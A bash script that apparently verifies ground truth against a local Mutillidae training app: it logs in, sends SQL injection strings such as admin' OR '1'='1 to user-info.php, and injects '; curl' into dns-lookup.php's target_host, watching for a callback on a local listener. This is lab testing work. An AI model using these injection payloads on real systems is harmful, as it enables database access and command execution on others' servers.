#!/bin/bash
# All-in-one ground-truth prober: php server (if dead) + login + manual probes
# for the two honest-gap questions: (1) user-info.php username SQLi,
# (2) dns-lookup.php target_host OS-cmdi (with local OAST-style callback check).
set -u
LOG=/home/z/my-project/tools/logs/php-server.log

# 1) stack alive?
code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "http://127.0.0.1:4290/index.php" 2>/dev/null)
if [ "$code" != "200" ] && [ "$code" != "302" ]; then
  echo "(relaunching php server)"
  cd /home/z/my-project/mutillidae-src/src
  PHP_CLI_SERVER_WORKERS=4 /home/z/my-project/tools/php/php \
    -d allow_url_include=1 -d allow_url_fopen=1 -d display_errors=1 \
    -d error_reporting=E_ALL -d upload_max_filesize=8M -d post_max_size=8M \
    -d session.use_strict_mode=0 -d max_execution_time=60 \
    -S 127.0.0.1:4290 >> "$LOG" 2>&1 &
  for i in $(seq 1 20); do
    sleep 1
    c=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "http://127.0.0.1:4290/index.php" 2>/dev/null)
    [ "$c" = "200" -o "$c" = "302" ] && break
  done
fi
echo "stack: $(curl -s -o /dev/null -w '%{http_code}' --max-time 4 http://127.0.0.1:4290/index.php)"

# 2) authenticated session
cd /tmp && rm -f gt_cj.txt
curl -s -c gt_cj.txt --max-time 10 "http://127.0.0.1:4290/index.php?page=login.php" -o /dev/null
curl -s -L -b gt_cj.txt -c gt_cj.txt --max-time 15 -X POST \
  "http://127.0.0.1:4290/index.php?page=login.php" \
  --data "username=admin&password=adminpass&login-php-submit-button=Login" \
  -o /tmp/gt_lg.html -w "login: %{http_code} "
grep -q "Logged In" /tmp/gt_lg.html && echo "OK (Logged In)" || { echo "FAILED"; grep -o "Log In Failed[^<]*" /tmp/gt_lg.html | head -1; grep -o "<title>[^<]*" /tmp/gt_lg.html | head -1; }

# 3) user-info SQLi probes (GET form)
echo "=== user-info.php username SQLi (BOTH fields set: username+password) ==="
curl -s -b gt_cj.txt --max-time 20 "http://127.0.0.1:4290/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=Check+Results" -o /tmp/gt_ui_base.html -w "base:   %{http_code} %{size_download}B\n"
curl -s -b gt_cj.txt --max-time 20 "http://127.0.0.1:4290/index.php?page=user-info.php&username=admin%27+OR+%271%27%3D%271&password=x&user-info-php-submit-button=Check+Results" -o /tmp/gt_ui_sqli.html -w "orpair: %{http_code} %{size_download}B\n"
grep -o "SQL syntax[^<]*" /tmp/gt_ui_sqli.html | head -1
grep -o "Fatal error[^<]*" /tmp/gt_ui_sqli.html | head -1
curl -s -b gt_cj.txt --max-time 20 "http://127.0.0.1:4290/index.php?page=user-info.php&username=admin%27&password=x&user-info-php-submit-button=Check+Results" -o /tmp/gt_ui_q.html -w "quote:  %{http_code} %{size_download}B\n"
grep -o "SQL syntax[^<]*" /tmp/gt_ui_q.html | head -1
echo "--- user-info result table present in base? ---"
grep -c "UID\\|Username" /tmp/gt_ui_base.html | head -1

# 4) dns-lookup cmdi probes: does target_host reach a shell?
echo "=== dns-lookup.php target_host cmdi ==="
# callback listener: if the app shell_execs our payload, curl hits this port
python3 -c "
import http.server, threading, subprocess, time
HITS = []
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        HITS.append(self.path)
        self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
srv = http.server.HTTPServer(('127.0.0.1', 3999), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
subprocess.run(['curl','-s','-b','/tmp/gt_cj.txt','--max-time','25',
  'http://127.0.0.1:4290/index.php?page=dns-lookup.php&target_host=127.0.0.1%3B+curl+http%3A%2F%2F127.0.0.1%3A3999%2Fpwn1&dns-lookup-php-submit-button=Lookup+DNS',
  '-o','/tmp/gt_dl.html','-w','cmdi-probe: %{http_code} %{size_download}B\n'])
time.sleep(3)
print('CALLBACK HITS:', HITS if HITS else 'NONE')
srv.shutdown()
"
grep -o "nslookup[^<]*" /tmp/gt_dl.html | head -2
# also the plain base behavior
curl -s -b gt_cj.txt --max-time 20 "http://127.0.0.1:4290/index.php?page=dns-lookup.php&target_host=127.0.0.1&dns-lookup-php-submit-button=Lookup+DNS" -o /tmp/gt_dl_base.html -w "dl-base: %{http_code} %{size_download}B\n"
grep -o "Server:[^<]*" /tmp/gt_dl_base.html | head -1
echo "=== done ==="
